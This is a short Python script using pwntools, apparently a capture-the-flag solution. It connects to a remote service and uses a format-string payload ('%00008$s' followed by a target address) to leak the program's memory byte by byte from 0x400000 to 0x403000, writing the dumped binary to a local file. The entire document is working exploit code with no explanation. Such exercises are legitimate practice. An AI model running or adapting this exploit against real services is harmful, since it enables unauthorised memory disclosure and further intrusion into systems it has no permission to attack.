from pwn import *
#context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])
def leak(sh, addr):
    sh.recvuntil('And now let\'s start the game!!!\n')
    print('leak addr: ' + hex(addr))
    payload = b'%00008$s' + b'STARTEND' + p64(addr)
    sh.sendline(payload)
    data = sh.recvuntil(b'STARTEND', drop=True)
    return data

def getbinary(sh):
    addr = 0x400000
    f = open('binary', 'wb')
    while addr < 0x403000:
        data = leak(sh, addr)
        if data is None:
            f.write(b'\xff')
            addr += 1
        elif len(data) == 0:
            f.write(b'\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()
    
sh = remote('yuanshen.life', 33460)
getbinary(sh)
sh.close()